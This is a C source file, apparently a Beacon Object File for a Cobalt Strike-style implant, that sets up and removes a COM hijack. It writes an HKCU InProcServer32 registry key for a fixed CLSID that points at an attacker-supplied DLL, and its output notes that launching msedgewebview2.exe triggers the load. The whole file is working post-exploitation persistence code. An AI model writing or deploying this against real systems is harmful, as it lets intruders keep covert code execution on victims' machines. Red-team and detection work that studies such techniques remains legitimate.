#include <windows.h>
#include <stdio.h>
#include "beacon.h"

// Define BeaconPrintf and other Beacon APIs
DECLSPEC_IMPORT WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT WINBASEAPI LSTATUS WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT WINBASEAPI LSTATUS WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyA(HKEY, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteValueA(HKEY, LPCSTR);

DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char*, const char*);

#define CLSID_TARGET "{54E211B6-3650-4F75-8334-FA359598E1C5}"
#define BASE_KEY "Software\\classes\\CLSID\\" CLSID_TARGET
#define INPROC_KEY BASE_KEY "\\InProcServer32"

void cleanup_hijack() {
    HKEY hKey;
    LSTATUS status;
    char existingPath[512];
    DWORD existingPathSize;
    DWORD valueType;
    
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, " COM Hijack - Cleanup Mode");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s", CLSID_TARGET);
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Check if the key exists
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking for existing COM hijack...");
    status = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, INPROC_KEY, 0, KEY_READ, &hKey);
    
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No COM hijack found - nothing to clean up");
        BeaconPrintf(CALLBACK_OUTPUT, "========================================");
        return;
    }
    
    // Read the current value to show what we're removing
    MSVCRT$memset(existingPath, 0, sizeof(existingPath));
    existingPathSize = sizeof(existingPath);
    
    status = ADVAPI32$RegQueryValueExA(
        hKey,
        "",
        NULL,
        &valueType,
        (LPBYTE)existingPath,
        &existingPathSize
    );
    
    ADVAPI32$RegCloseKey(hKey);
    
    if (status == ERROR_SUCCESS && existingPathSize > 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found existing COM hijack:");
        BeaconPrintf(CALLBACK_OUTPUT, "    DLL Path: %s", existingPath);
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Delete InProcServer32 subkey
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Deleting InProcServer32 key...");
    status = ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, INPROC_KEY);
    
    if (status == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] InProcServer32 key deleted successfully");
    } else if (status == ERROR_FILE_NOT_FOUND) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] InProcServer32 key not found (already deleted?)");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete InProcServer32 key: %d", status);
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Delete base CLSID key
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Deleting CLSID key...");
    status = ADVAPI32$RegDeleteKeyA(HKEY_CURRENT_USER, BASE_KEY);
    
    if (status == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] CLSID key deleted successfully");
    } else if (status == ERROR_FILE_NOT_FOUND) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] CLSID key not found (already deleted?)");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete CLSID key: %d", status);
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] COM Hijack cleanup completed!");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Note: DLL files were NOT deleted from disk");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Manually delete if needed:");
    if (existingPathSize > 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "    del \"%s\"", existingPath);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
}

void setup_hijack(char* hijackDllPath, int pathLen) {
    HKEY hKey;
    LSTATUS status;
    DWORD disposition;
    char existingPath[512];
    DWORD existingPathSize;
    DWORD valueType;
    
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, " COM Hijack - Setup Mode");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target CLSID: %s", CLSID_TARGET);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Hijack DLL Path: %s", hijackDllPath);
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Check if InProcServer32 key already exists with a value
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking if COM hijack already configured...");
    status = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, INPROC_KEY, 0, KEY_READ, &hKey);
    
    if (status == ERROR_SUCCESS) {
        MSVCRT$memset(existingPath, 0, sizeof(existingPath));
        existingPathSize = sizeof(existingPath);
        
        status = ADVAPI32$RegQueryValueExA(
            hKey,
            "",
            NULL,
            &valueType,
            (LPBYTE)existingPath,
            &existingPathSize
        );
        
        ADVAPI32$RegCloseKey(hKey);
        
        if (status == ERROR_SUCCESS && existingPathSize > 1) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] COM hijack is ALREADY CONFIGURED!");
            BeaconPrintf(CALLBACK_OUTPUT, "");
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Current DLL Path: %s", existingPath);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Requested Path:   %s", hijackDllPath);
            BeaconPrintf(CALLBACK_OUTPUT, "");
            BeaconPrintf(CALLBACK_OUTPUT, "[-] No changes made. To reconfigure:");
            BeaconPrintf(CALLBACK_OUTPUT, "    1. Run cleanup: execute_coff ... -Arguments string:cleanup");
            BeaconPrintf(CALLBACK_OUTPUT, "    2. Run setup again with new path");
            BeaconPrintf(CALLBACK_OUTPUT, "========================================");
            return;
        }
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] No existing hijack found - proceeding with setup");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Create base CLSID key
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Creating CLSID registry key...");
    
    status = ADVAPI32$RegCreateKeyExA(
        HKEY_CURRENT_USER,
        BASE_KEY,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &disposition
    );
    
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create CLSID key: %d", status);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] CLSID key created");
    ADVAPI32$RegCloseKey(hKey);
    
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Create InProcServer32 subkey
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Creating InProcServer32 key...");
    
    status = ADVAPI32$RegCreateKeyExA(
        HKEY_CURRENT_USER,
        INPROC_KEY,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &disposition
    );
    
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create InProcServer32 key: %d", status);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] InProcServer32 key created");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Set DLL path (default value)
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 3: Setting DLL path...");
    
    status = ADVAPI32$RegSetValueExA(
        hKey,
        "",
        0,
        REG_SZ,
        (const BYTE*)hijackDllPath,
        pathLen + 1
    );
    
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set DLL path: %d", status);
        ADVAPI32$RegCloseKey(hKey);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] DLL path set successfully");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Set Threading Model
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 4: Setting ThreadingModel...");
    const char* threadingModel = "Both";
    int threadingModelLen = MSVCRT$strlen(threadingModel);
    
    status = ADVAPI32$RegSetValueExA(
        hKey,
        "ThreadingModel",
        0,
        REG_SZ,
        (const BYTE*)threadingModel,
        threadingModelLen + 1
    );
    
    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to set ThreadingModel: %d", status);
        ADVAPI32$RegCloseKey(hKey);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ThreadingModel set successfully");
    ADVAPI32$RegCloseKey(hKey);
    
    // Summary
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] COM Hijack setup completed!");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Configuration:");
    BeaconPrintf(CALLBACK_OUTPUT, "    DLL Path: %s", hijackDllPath);
    BeaconPrintf(CALLBACK_OUTPUT, "    Threading Model: Both");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Upload DLL files separately");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Trigger: start msedgewebview2.exe");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
}

void go(char *args, int len) {
    datap parser;
    char* argument;
    int argLen;
    
    BeaconDataParse(&parser, args, len);
    
    // Extract the first argument
    argument = BeaconDataExtract(&parser, &argLen);
    
    if (argument == NULL || argLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No argument provided");
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage:");
        BeaconPrintf(CALLBACK_ERROR, "    Setup:   string:<dll_path>");
        BeaconPrintf(CALLBACK_ERROR, "    Cleanup: string:cleanup");
        return;
    }
    
    // Check if this is cleanup mode
    if (MSVCRT$strcmp(argument, "cleanup") == 0) {
        cleanup_hijack();
        return;
    }
    
    // Otherwise, treat it as setup mode with DLL path
    int pathLen = MSVCRT$strlen(argument);
    
    if (pathLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] DLL path is empty");
        return;
    }
    
    setup_hijack(argument, pathLen);
}